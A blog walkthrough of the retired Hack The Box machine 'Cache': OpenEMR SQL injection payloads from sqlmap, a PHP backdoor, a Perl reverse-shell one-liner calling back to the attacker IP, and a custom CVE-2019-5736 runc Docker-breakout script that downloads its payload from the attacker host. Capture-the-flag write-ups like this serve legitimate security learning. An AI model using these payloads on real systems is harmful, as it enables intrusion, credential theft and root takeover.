---
layout: post  
title: "Cache: Hack The Box Walkthrough"
date: 2020-10-10 17:27:34 +0000
last_modified_at: 2020-10-10 17:27:34 +0000
category: Walkthrough
tags: ["Hack The Box", Cache, retired, Linux, Medium]
comments: true
protect: false
image:
  feature: cache-htb-walkthrough.png
---

This post documents the complete walkthrough of Cache, a retired vulnerable [VM][1] created by [ASHacker][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Cache is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let's start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.188 --rate=500

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-05-11 06:55:41 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.10.188
Discovered open port 80/tcp on 10.10.10.188
```

Pretty common list of open ports. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p22,80 -A --reason 10.10.10.188 -oN nmap.txt
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 (RSA)
|   256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 (ECDSA)
|_  256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c (ED25519)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Cache
```

Whoa, this is a shit-show man. In any case, this is what the site looks like.

{% include image.html image_alt="e4a298ac.png" image_src="/54f48b6c-2079-418a-8a86-19da8d492067/e4a298ac.png" %}

What a nostalgic feeling with the scrolling marquee! I'd better put `cache.htb` into `/etc/hosts`.

### Fake Login Page

It's worth mentioning that there's a fake login page at `login.html` that leads to nothing.

{% include image.html image_alt="cf615222.png" image_src="/54f48b6c-2079-418a-8a86-19da8d492067/cf615222.png" %}

When you peek inside the JS debugger, you'll see the correct username and password.

{% include image.html image_alt="42178fec.png" image_src="/54f48b6c-2079-418a-8a86-19da8d492067/42178fec.png" %}

Maybe the credential (`ash:H@v3_fun`) will come in handy later?

### Hospital Management System (HMS)

We are told that ASH is involved in another project, Hospital Management System. By extension, if CACHE is at `cache.htb`, HMS must be at `hms.htb`. Let's add that into `/etc/hosts` as well.

{% include image.html image_alt="26a1c265.png" image_src="/54f48b6c-2079-418a-8a86-19da8d492067/26a1c265.png" %}

Indeed. The moment I navigate to `hms.htb`, I was greeted by another login page.

{% include image.html image_alt="99664bbd.png" image_src="/54f48b6c-2079-418a-8a86-19da8d492067/99664bbd.png" %}

### Vulnerability Assessment of OpenEMR

The official [wiki](https://www.open-emr.org/wiki/index.php/OpenEMR_Wiki_Home_Page) provides a comprehensive [list](https://www.open-emr.org/wiki/index.php/Codebase_Security) of vulnerability assessment of OpenEMR's codebase.

The report by Project Insecure is closest in terms of version to this OpenEMR found by navigating to `hms.htb/admin.php`.

{% include image.html image_alt="0a33855b.png" image_src="/54f48b6c-2079-418a-8a86-19da8d492067/0a33855b.png" %}

We can also determine the database server used by navigating to `hms.htb/gacl/setup.php`.

{% include image.html image_alt="cc08c113.png" image_src="/54f48b6c-2079-418a-8a86-19da8d492067/cc08c113.png" %}

#### SQL Injection in `find_appt_popup_user.php`

We don't need any authentication for this SQL injection to occur. All we need is to navigate to `hms.htb/portal/account/register.php` and grab the **PHPSESSID** cookie. I'll leave it as an exercise how to do that.

Meanwhile, check out the output of `sqlmap`.

```
# sqlmap --cookie="PHPSESSID=ir5gcqe0i3uceaf0ifie0m8m2c" --dbms=mysql --url=http://hms.htb/portal/add_edit_event_user.php?eid=1 --batch
...
GET parameter 'eid' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:
---
Parameter: eid (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: eid=(SELECT (CASE WHEN (9069=9069) THEN 1 ELSE (SELECT 4613 UNION SELECT 8637) END))

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: eid=1 AND EXTRACTVALUE(2267,CONCAT(0x5c,0x716a7a7a71,(SELECT (ELT(2267=2267,1))),0x7178787871))

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: eid=1 AND (SELECT 1732 FROM (SELECT(SLEEP(5)))dBnh)

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: eid=1 UNION ALL SELECT NULL,NULL,CONCAT(0x716a7a7a71,0x49446f6754454d424968747879596b4d4b426e746e73794f71704b756461647a4872635562624d62,0x7178787871),NULL-- -
---
```

The main objective of the SQL injection is to dump out password hash of the OpenEMR administrator like so.

{% include image.html image_alt="4c6a8469.png" image_src="/54f48b6c-2079-418a-8a86-19da8d492067/4c6a8469.png" %}

Notice that the username is `openemr_admin`? Let's throw that password hash to John the Ripper and see what we get.

{% include image.html image_alt="adf15fb9.png" image_src="/54f48b6c-2079-418a-8a86-19da8d492067/adf15fb9.png" %}

Really? The credential is (`openemr_admin:xxxxxx`)??!! There's only one way to find out.

{% include image.html image_alt="7c9b9130.png" image_src="/54f48b6c-2079-418a-8a86-19da8d492067/7c9b9130.png" %}

Sweet!

## Low-Privilege Shell

With that, we can now attempt EDB-ID [45202](https://www.exploit-db.com/exploits/45202) to write a PHP backdoor in Burp.

{% include image.html image_alt="643cfe8c.png" image_src="/54f48b6c-2079-418a-8a86-19da8d492067/643cfe8c.png" %}

Let's give it a shot.

{% include image.html image_alt="7b15ad9b.png" image_src="/54f48b6c-2079-418a-8a86-19da8d492067/7b15ad9b.png" %}

We can run a Perl one-liner reverse shell back to us.

```
perl -e 'use Socket;$i="10.10.16.17";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

Of course, we need to `urlencode` the one-liner to prevent any complications. We should get our reverse shell in our `netcat` listener.

{% include image.html image_alt="68b02e6d.png" image_src="/54f48b6c-2079-418a-8a86-19da8d492067/68b02e6d.png" %}

It's customary to display the contents of `/etc/passwd`.

{% include image.html image_alt="199151be.png" image_src="/54f48b6c-2079-418a-8a86-19da8d492067/199151be.png" %}

So `ash` is user with UID 1000. The file `user.txt` should be in the home directory.

{% include image.html image_alt="2af689ce.png" image_src="/54f48b6c-2079-418a-8a86-19da8d492067/2af689ce.png" %}

### Getting `user.txt`

Notice that `ash` is not allowed to login via SSH even though **PasswordAuthentication** is allowed in `/etc/ssh/sshd_config`?

```
PasswordAuthentication yes

AllowUsers luffy
DenyUsers ash
```

Now that we have a shell, we can `su` to `ash` instead. But, what's the password? Recall earlier we have established the following credential (`ash:H@v3_fun`)? Maybe that's the password?

{% include image.html image_alt="62e99841.png" image_src="/54f48b6c-2079-418a-8a86-19da8d492067/62e99841.png" %}

Indeed.

## Privilege Escalation

During enumeration of `ash`'s account, I noticed that `memcached` is running at `11211/tcp`.

### Memcached

I've written about `memcached` in [Dab](https://hackso.me/dab-htb-walkthrough/#memcached) before. With that, let's list down the slabs that's in store.

{% include image.html image_alt="ab202dbd.png" image_src="/54f48b6c-2079-418a-8a86-19da8d492067/ab202dbd.png" %}

OK. There's only one slab. Now, let's dump the slab with `cachedump`.

{% include image.html image_alt="befedc5f.png" image_src="/54f48b6c-2079-418a-8a86-19da8d492067/befedc5f.png" %}

`user` and `passwd` look interesting.

{% include image.html image_alt="c37947ba.png" image_src="/54f48b6c-2079-418a-8a86-19da8d492067/c37947ba.png" %}

I think we have the password of `luffy`. Of course it's One Piece (or `0n3_p1ec3`). :laughing:

### CVE-2019-5736 - Breaking out of Docker via runC

You'll notice `luffy` is a member of the group `docker`.

{% include image.html image_alt="a7382d95.png" image_src="/54f48b6c-2079-418a-8a86-19da8d492067/a7382d95.png" %}

And courtesy of `pspy64`, you'll also notice that a copy of `ori_runc` is copied to `runc` every minute on the minute. Something tells me that this has something to do with [CVE-2019-5736](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-5736).

{% include image.html image_alt="5d0f20ba.png" image_src="/54f48b6c-2079-418a-8a86-19da8d492067/5d0f20ba.png" %}

Indeed. Check out the version of `runc` and `docker` on this machine.

{% include image.html image_alt="32561935.png" image_src="/54f48b6c-2079-418a-8a86-19da8d492067/32561935.png" %}

According to the CVE,

> `runc` through 1.0-rc6, as used in Docker before 18.09.2 and other products, allows attackers to overwrite the host `runc` binary (and consequently obtain host `root` access) by leveraging the ability to execute a command as `root` within one of these types of containers: (1) a new container with an attacker-controlled image, or (2) an existing container, to which the attacker previously had write access, that can be attached with docker exec. This occurs because of file-descriptor mishandling, related to `/proc/self/exe`.

I took a leaf from this [write-up](https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/) and combine with the payload from EDB-ID [46359](https://www.exploit-db.com/exploits/46359) to come up with my own exploit.

<div class="filename"><span>exploit.sh</span></div>

```bash
#!/bin/bash

RHOST=10.10.16.17

if [ "$PWD" != "/dev/shm" ]; then
    cd /dev/shm
    mv $OLDPWD/$0 .
fi

wget http://${RHOST}/exploit.tar
tar xf exploit.tar
rm *.c
rm exploit.tar

# exploit
docker build --tag runc_pwn:3 .
docker run --rm --name pwn -d runc_pwn:3
docker exec pwn bash

# clean up
while :; do
    if [ $(docker ps -f "name=pwn" | wc -l) -ne 2 ]; then
        docker image rm runc_pwn:3
        rm -f *
        break
    fi
done
```

The script will download `exploit.tar` from my attacking machine running Python HTTPServer. It'll extract the files from `exploit.tar`, build a Docker image, run a container, and then run `runc` through `docker exec`. On my attacking machine, I'll set up a `netcat` listener to catch the payload which is a reverse shell. Upon exiting the reverse shell, the script will clean up itself.

Here's the contents of `exploit.tar`.

<div class="filename"><span>exploit.tar</span></div>

```
   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2020-05-12 13:14:56 .....           17          512  bash_evil
2020-05-12 13:19:25 .....          319          512  Dockerfile
2020-05-12 13:32:26 .....        16872        16896  new_runc
2020-05-12 13:32:19 .....          649         1024  new_runc.c
2020-05-12 13:14:56 .....        13352        13824  overwrite_runc
2020-05-12 13:14:56 .....         3631         4096  overwrite_runc.c
2020-05-12 13:14:56 .....          416          512  replace.sh
------------------- ----- ------------ ------------  ------------------------
2020-05-12 13:32:26              35256        37376  7 files
```

The contents of Dockerfile is crucial in running the exploit successfully.

<div class="filename"><span>Dockerfile</span></div>

```
FROM ubuntu:latest

COPY replace.sh /
RUN ["chmod", "+x", "/replace.sh"]
COPY overwrite_runc /overwrite_runc
RUN ["chmod", "+x", "/overwrite_runc"]
COPY new_runc /

RUN ["mv", "/bin/bash", "/bin/bash_original"]
COPY bash_evil /bin/bash
RUN ["chmod", "+x", "/bin/bash"]

ENTRYPOINT ["/bin/bash_original", "/replace.sh"]
```

It builds an image tagged as `runc_pwn:3` from the `ubuntu:latest` image on the machine. Not surprising, `luffy`, as a member of the `docker` group, has access to run `docker`.

{% include image.html image_alt="f4f880c4.png" image_src="/54f48b6c-2079-418a-8a86-19da8d492067/f4f880c4.png" %}

Time to give it a shot.

{% include asciinema.html url="https://asciinema.org/a/55kugWt1oUtaAI3ASAM6TKnkB" title="Running exploit.sh" author="limbernie" poster="npt:0:01" speed="0.75" cols="110" rows="40" %}

Awesome.

### Getting `root.txt`

Armed with a `root` shell, getting `root.txt` is a breeze.

{% include image.html image_alt="19db1e03.png" image_src="/54f48b6c-2079-418a-8a86-19da8d492067/19db1e03.png" %}

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/251
[2]: https://www.hackthebox.eu/home/users/profile/23227
[3]: https://www.hackthebox.eu/
